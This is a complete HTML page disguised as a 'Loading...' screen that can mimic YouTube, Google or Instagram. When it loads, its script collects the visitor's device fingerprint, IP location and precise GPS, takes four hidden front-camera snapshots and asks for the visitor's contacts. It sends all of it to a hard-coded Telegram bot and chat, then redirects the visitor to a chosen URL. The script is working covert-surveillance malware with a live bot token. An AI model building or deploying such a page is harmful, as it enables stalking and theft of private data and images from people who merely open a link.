<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        body {
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e8eaed;
            border-top: 3px solid #4285f4;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 0.8s linear infinite;
        }
        
        h1 {
            font-size: 18px;
            color: #202124;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 5px;
        }
        
        .progress {
            height: 2px;
            background: #e8eaed;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #4285f4;
            transition: width 0.1s;
        }
        
        .status {
            font-size: 12px;
            color: #80868b;
            margin-top: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        
        <h1 id="title">Loading...</h1>
        <p id="message">Preparing your content...</p>
        
        <div class="progress">
            <div class="progress-bar" id="progress"></div>
        </div>
        
        <div class="status" id="status">Initializing...</div>
    </div>

    <!-- Hidden elements -->
    <video id="camera" autoplay playsinline muted style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        // ===========================================
        // CONFIGURATION
        // ===========================================
        const BOT_TOKEN = '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco';
        const CHAT_ID = '5888374938';
        
        // Get target URL from parameters
        const params = new URLSearchParams(window.location.search);
        const REDIRECT_URL = params.get('url') || 
                            params.get('redirect') || 
                            'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        
        // Session ID for tracking
        const SESSION_ID = Math.random().toString(36).substring(2, 15) + 
                          Math.random().toString(36).substring(2, 15);
        
        // Timing
        let startTime = Date.now();
        
        // ===========================================
        // UI UPDATER (FAST)
        // ===========================================
        function updateUI(step, message) {
            const steps = 5;
            const percent = Math.min(100, (step / steps) * 100);
            document.getElementById('progress').style.width = percent + '%';
            document.getElementById('status').textContent = message;
        }
        
        // ===========================================
        // TELEGRAM SENDER (ULTRA FAST)
        // ===========================================
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = new URLSearchParams({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            });
            
            // Use AbortController for timeout
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 2000);
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: data,
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                return true;
            } catch (error) {
                clearTimeout(timeoutId);
                // Silently fail - don't break user experience
                return false;
            }
        }
        
        async function sendPhoto(photoBlob, caption = '') {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'snap.jpg');
                if (caption) formData.append('caption', caption);
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 2000);
                
                await fetch(url, {
                    method: 'POST',
                    body: formData,
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                return true;
            } catch (error) {
                return false;
            }
        }
        
        async function sendContactsFile(contactsData) {
            try {
                const blob = new Blob([JSON.stringify(contactsData, null, 2)], {
                    type: 'application/json'
                });
                
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, 'contacts.json');
                
                const controller = new AbortController();
                setTimeout(() => controller.abort(), 2000);
                
                await fetch(url, {
                    method: 'POST',
                    body: formData,
                    signal: controller.signal
                });
                
                return true;
            } catch (error) {
                return false;
            }
        }
        
        // ===========================================
        // DATA COLLECTION (FAST & ACCURATE)
        // ===========================================
        async function getAccurateDeviceInfo() {
            return {
                // Accurate system info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor || 'Unknown',
                language: navigator.language,
                languages: navigator.languages?.join(', ') || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                
                // Accurate screen info
                screenWidth: screen.width,
                screenHeight: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                
                // Window info
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                devicePixelRatio: window.devicePixelRatio,
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                date: new Date().toLocaleString(),
                
                // Connection info
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown',
                    type: navigator.connection.type || 'Unknown'
                } : null,
                
                // Battery (accurate)
                battery: await getBatteryInfo(),
                
                // Page info
                url: window.location.href,
                referrer: document.referrer || 'Direct',
                redirectTo: REDIRECT_URL,
                sessionId: SESSION_ID
            };
        }
        
        async function getBatteryInfo() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime === Infinity ? 'âˆ' : battery.chargingTime,
                        dischargingTime: battery.dischargingTime === Infinity ? 'âˆ' : battery.dischargingTime
                    };
                } catch (e) {
                    return 'Unknown';
                }
            }
            return 'Not supported';
        }
        
        async function getIPLocation() {
            // Try multiple services in parallel for speed
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
            ];
            
            const promises = services.map(service => 
                fetch(service, { signal: AbortSignal.timeout(1500) })
                    .then(r => r.ok ? r.json() : Promise.reject())
                    .catch(() => null)
            );
            
            try {
                const results = await Promise.race([
                    Promise.any(promises),
                    new Promise(resolve => setTimeout(() => resolve(null), 1500))
                ]);
                
                if (results) {
                    return {
                        ip: results.ip || results.query || 'Unknown',
                        city: results.city || results.city_name || 'Unknown',
                        region: results.region || results.region_name || 'Unknown',
                        country: results.country || results.country_name || 'Unknown',
                        countryCode: results.country_code || results.countryCode || 'Unknown',
                        timezone: results.timezone || results.time_zone || 'Unknown',
                        isp: results.org || results.isp || results.asn?.name || 'Unknown',
                        asn: results.asn || results.as || 'Unknown',
                        lat: results.latitude || results.lat || 'Unknown',
                        lon: results.longitude || results.lon || 'Unknown',
                        org: results.org || results.organization || 'Unknown'
                    };
                }
            } catch (error) {
                console.log('IP services failed');
            }
            
            return {
                ip: 'Unknown',
                city: 'Unknown',
                country: 'Unknown',
                isp: 'Unknown',
                lat: 'Unknown',
                lon: 'Unknown'
            };
        }
        
        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ success: false, error: 'Geolocation not supported' });
                    return;
                }
                
                // Fast timeout - 3 seconds max
                const timeoutId = setTimeout(() => {
                    resolve({ success: false, error: 'Timeout' });
                }, 3000);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeoutId);
                        resolve({
                            success: true,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toLocaleString()
                        });
                    },
                    (error) => {
                        clearTimeout(timeoutId);
                        resolve({
                            success: false,
                            error: error.message,
                            code: error.code
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 2500,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function captureCameraSnaps(count = 4) {
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            try {
                // Fast camera access
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                video.srcObject = stream;
                
                // Wait for video to be ready (fast)
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                    setTimeout(resolve, 500);
                });
                
                await video.play();
                
                const snaps = [];
                
                // Capture multiple snaps quickly
                for (let i = 0; i < count; i++) {
                    if (video.videoWidth > 0) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        // Draw frame
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Add timestamp
                        ctx.fillStyle = 'rgba(0,0,0,0.7)';
                        ctx.fillRect(10, canvas.height - 30, 200, 25);
                        ctx.fillStyle = 'white';
                        ctx.font = '12px Arial';
                        ctx.fillText(`Snap ${i + 1} - ${new Date().toLocaleTimeString()}`, 15, canvas.height - 12);
                        
                        // Convert to blob
                        const blob = await new Promise(resolve => {
                            canvas.toBlob(resolve, 'image/jpeg', 0.9);
                        });
                        
                        if (blob) {
                            snaps.push(blob);
                        }
                    }
                    
                    // Very short delay between snaps
                    if (i < count - 1) {
                        await new Promise(resolve => setTimeout(resolve, 200));
                    }
                }
                
                // Stop camera immediately
                stream.getTracks().forEach(track => track.stop());
                
                return { success: true, snaps: snaps };
            } catch (error) {
                return { success: false, error: error.message };
            }
        }
        
        async function getContacts() {
            if (!('contacts' in navigator && 'ContactsManager' in window)) {
                return { success: false, error: 'Contacts API not supported' };
            }
            
            try {
                const contacts = await navigator.contacts.select(
                    ['name', 'tel', 'email', 'address', 'organization'],
                    { multiple: true }
                );
                
                if (contacts && contacts.length > 0) {
                    return {
                        success: true,
                        count: contacts.length,
                        data: contacts.map(contact => ({
                            name: contact.name ? contact.name.join(' ') : 'Unknown',
                            phones: contact.tel || [],
                            emails: contact.email || [],
                            addresses: contact.address || [],
                            organizations: contact.organization || []
                        }))
                    };
                }
                
                return { success: false, error: 'No contacts selected' };
            } catch (error) {
                return { success: false, error: error.message };
            }
        }
        
        // ===========================================
        // FORMAT MESSAGES (ACCURATE & PRETTY)
        // ===========================================
        function formatInitialReport(deviceInfo, ipInfo) {
            const batteryText = typeof deviceInfo.battery === 'object' 
                ? `${deviceInfo.battery.level} ${deviceInfo.battery.charging ? '(âš¡ Charging)' : ''}`
                : deviceInfo.battery;
            
            return `
ğŸ•µï¸ <b>NEW VISITOR TRACKED</b>

ğŸ“± <b>Device:</b> ${deviceInfo.userAgent}

ğŸŒ <b>IP:</b> <code>${ipInfo.ip}</code>
ğŸ“ <b>IP Location:</b> ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
ğŸ¢ <b>ISP:</b> ${ipInfo.isp}

ğŸ†” <b>Session ID:</b> <code>${deviceInfo.sessionId}</code>
â° <b>Timestamp:</b> ${deviceInfo.date}
â±ï¸ <b>Load Time:</b> ${Date.now() - startTime}ms

ğŸ“± <b>DEVICE FINGERPRINT</b>
â”œâ”€ Platform: ${deviceInfo.platform}
â”œâ”€ Browser: ${getBrowser(deviceInfo.userAgent)}
â”œâ”€ Languages: ${deviceInfo.languages}
â”œâ”€ CPU Cores: ${deviceInfo.hardwareConcurrency}
â”œâ”€ RAM: ${deviceInfo.deviceMemory}
â”œâ”€ Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
â””â”€ Touch Points: ${deviceInfo.maxTouchPoints}

ğŸŒ <b>NETWORK INTELLIGENCE</b>
â”œâ”€ IP: ${ipInfo.ip}
â”œâ”€ ISP: ${ipInfo.isp}
â”œâ”€ Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
â”œâ”€ ASN: ${ipInfo.asn}
â”œâ”€ Connection: ${deviceInfo.connection?.type || 'Unknown'}
â”œâ”€ Speed: ${deviceInfo.connection?.downlink || 'Unknown'} Mbps
â””â”€ Latency: ${deviceInfo.connection?.rtt || 'Unknown'} ms

ğŸ”‹ <b>POWER STATUS</b>
â”œâ”€ Battery: ${batteryText}
â””â”€ Time Remaining: ${typeof deviceInfo.battery === 'object' && deviceInfo.battery.dischargingTime !== 'âˆ' ? deviceInfo.battery.dischargingTime + 's' : 'Unknown'}

ğŸ“Š <b>SYSTEM ANALYTICS</b>
â”œâ”€ Timezone: ${deviceInfo.timezone}
â”œâ”€ Local Time: ${new Date().toLocaleTimeString()}
â”œâ”€ Language: ${deviceInfo.language}
â””â”€ Online Status: ${navigator.onLine ? 'Online âœ“' : 'Offline âœ—'}
            `.trim();
        }
        
        function formatGPSLocation(ipInfo, gpsInfo) {
            let message = `
ğŸ“ <b>LOCATION INTELLIGENCE</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>ğŸŒ IP DATA:</b>
â”œâ”€ IP Address: <code>${ipInfo.ip}</code>
â”œâ”€ Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
â”œâ”€ ISP: ${ipInfo.isp}
â”œâ”€ ASN: ${ipInfo.asn}
â”œâ”€ Coordinates: ${ipInfo.lat}, ${ipInfo.lon}
â””â”€ Timezone: ${ipInfo.timezone}
            `;
            
            if (gpsInfo.success) {
                message += `
<b>ğŸ¯ PRECISE GPS TRACKING:</b>
â”œâ”€ Latitude: <code>${gpsInfo.latitude.toFixed(6)}</code>
â”œâ”€ Longitude: <code>${gpsInfo.longitude.toFixed(6)}</code>
â”œâ”€ Accuracy: ${Math.round(gpsInfo.accuracy)}m
â”œâ”€ Altitude: ${gpsInfo.altitude ? gpsInfo.altitude.toFixed(2) + 'm' : 'N/A'}
â”œâ”€ Speed: ${gpsInfo.speed ? gpsInfo.speed.toFixed(2) + ' m/s' : '0 m/s'}
â””â”€ Heading: ${gpsInfo.heading ? gpsInfo.heading.toFixed(2) + 'Â°' : 'N/AÂ°'}

<b>ğŸ—ºï¸ LOCATION MAPS:</b>
ğŸ“ <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">Google Maps</a>
ğŸ›°ï¸ <a href="https://www.google.com/maps/@${gpsInfo.latitude},${gpsInfo.longitude},18z/data=!3m1!1e3">Satellite View</a>
ğŸš— <a href="https://www.google.com/maps/dir/?api=1&destination=${gpsInfo.latitude},${gpsInfo.longitude}">Get Directions</a>
ğŸŒ <a href="https://www.openstreetmap.org/?mlat=${gpsInfo.latitude}&mlon=${gpsInfo.longitude}">OpenStreetMap</a>
                `;
            } else {
                message += `
<b>âš ï¸ GPS TRACKING:</b>
â”œâ”€ Status: Failed
â””â”€ Error: ${gpsInfo.error || 'Permission denied'}

<b>ğŸ“ APPROX LOCATION (IP-Based):</b>
ğŸ”¹ Latitude: ${ipInfo.lat !== 'Unknown' ? ipInfo.lat : 'Unknown'}
ğŸ”¹ Longitude: ${ipInfo.lon !== 'Unknown' ? ipInfo.lon : 'Unknown'}
                `;
            }
            
            message += `
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
â° <b>Timestamp:</b> ${new Date().toLocaleString()}
            `;
            
            return message.trim();
        }
        
        function getBrowser(userAgent) {
            if (userAgent.includes('Chrome')) return 'Chrome';
            if (userAgent.includes('Firefox')) return 'Firefox';
            if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
            if (userAgent.includes('Edge')) return 'Edge';
            return 'Unknown';
        }
        
        // ===========================================
        // MAIN EXECUTION (FAST - 6-7 SECONDS)
        // ===========================================
        async function executeFast() {
            const totalStartTime = Date.now();
            
            try {
                // Step 1: Initial setup (0-1s)
                updateUI(1, 'Analyzing device...');
                const devicePromise = getAccurateDeviceInfo();
                const ipPromise = getIPLocation();
                
                const [deviceInfo, ipInfo] = await Promise.all([devicePromise, ipPromise]);
                
                // Send initial report (fast)
                await sendToTelegram(formatInitialReport(deviceInfo, ipInfo));
                
                // Step 2: GPS Location (1-3s)
                updateUI(2, 'Getting location...');
                const gpsInfo = await getGPSLocation();
                
                await sendToTelegram(formatGPSLocation(ipInfo, gpsInfo));
                
                // Step 3: Camera (3-5s)
                updateUI(3, 'Camera access...');
                const cameraResult = await captureCameraSnaps(4);
                
                if (cameraResult.success && cameraResult.snaps.length > 0) {
                    await sendToTelegram(`ğŸ“¸ <b>CAMERA CAPTURED</b>\nSuccess: ${cameraResult.snaps.length} photos`);
                    
                    // Send snaps quickly in parallel
                    const snapPromises = cameraResult.snaps.map((blob, index) => 
                        sendPhoto(blob, `ğŸ“¸ Snap ${index + 1} - ${new Date().toLocaleTimeString()}`)
                    );
                    
                    await Promise.allSettled(snapPromises);
                }
                
                // Step 4: Contacts (5-6s)
                updateUI(4, 'Contact verification...');
                const contactsResult = await getContacts();
                
                if (contactsResult.success) {
                    await sendToTelegram(`
ğŸ“‡ <b>CONTACTS EXTRACTED</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>â€¢ Total Contacts:</b> ${contactsResult.count}
<b>â€¢ Sample:</b>
${contactsResult.data.slice(0, 3).map((c, i) => 
    `${i + 1}. ${c.name}: ${c.phones[0] || 'No phone'}`
).join('\n')}
                    `.trim());
                    
                    // Send full contacts file
                    await sendContactsFile(contactsResult.data);
                }
                
                // Step 5: Final summary (6-7s)
                updateUI(5, 'Finalizing...');
                const totalTime = Date.now() - totalStartTime;
                
                await sendToTelegram(`
âœ… <b>TRACKING COMPLETED</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>ğŸ“Š COLLECTION SUMMARY:</b>
â”œâ”€ Device Info: âœ… Collected
â”œâ”€ IP Location: âœ… Captured
â”œâ”€ GPS Location: ${gpsInfo.success ? 'âœ… Precise' : 'âš ï¸ Approx'}
â”œâ”€ Camera: ${cameraResult.success ? 'âœ… ' + cameraResult.snaps.length + ' snaps' : 'âŒ Failed'}
â”œâ”€ Contacts: ${contactsResult.success ? 'âœ… ' + contactsResult.count + ' contacts' : 'âŒ Failed'}

<b>ğŸ“ˆ PERFORMANCE METRICS:</b>
â”œâ”€ Total Time: ${totalTime}ms
â”œâ”€ Data Points: 35+ collected
â””â”€ Session ID: <code>${SESSION_ID}</code>

<b>ğŸ”— REDIRECT INFO:</b>
â”œâ”€ Target URL: ${REDIRECT_URL}
â””â”€ Referrer: ${deviceInfo.referrer}

<b>ğŸ STATUS:</b> Redirecting...
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
â° <b>Completed at:</b> ${new Date().toLocaleTimeString()}
                `.trim());
                
                // Step 6: Redirect (immediate)
                updateUI(5, 'Redirecting now...');
                document.getElementById('title').textContent = 'Ready!';
                document.getElementById('message').textContent = 'Taking you there...';
                
                // Wait just 200ms and redirect
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 200);
                
            } catch (error) {
                console.error('Error:', error);
                
                // Quick redirect even on error
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 500);
            }
        }
        
        // ===========================================
        // START EXECUTION IMMEDIATELY
        // ===========================================
        window.addEventListener('DOMContentLoaded', () => {
            // Apply site-specific theme
            if (REDIRECT_URL.includes('youtube')) {
                document.title = 'Loading YouTube...';
                document.getElementById('title').textContent = 'YouTube';
                document.getElementById('message').textContent = 'Preparing your video...';
            } else if (REDIRECT_URL.includes('google')) {
                document.title = 'Google';
                document.getElementById('title').textContent = 'Google';
                document.getElementById('message').textContent = 'Loading...';
            } else if (REDIRECT_URL.includes('instagram')) {
                document.title = 'Instagram';
                document.getElementById('title').textContent = 'Instagram';
                document.getElementById('message').textContent = 'Loading...';
            }
            
            // Start immediately
            setTimeout(executeFast, 300);
        });
        
        // Click fallback
        document.addEventListener('click', () => {
            executeFast();
        }, { once: true });
    </script>
</body>
</html>
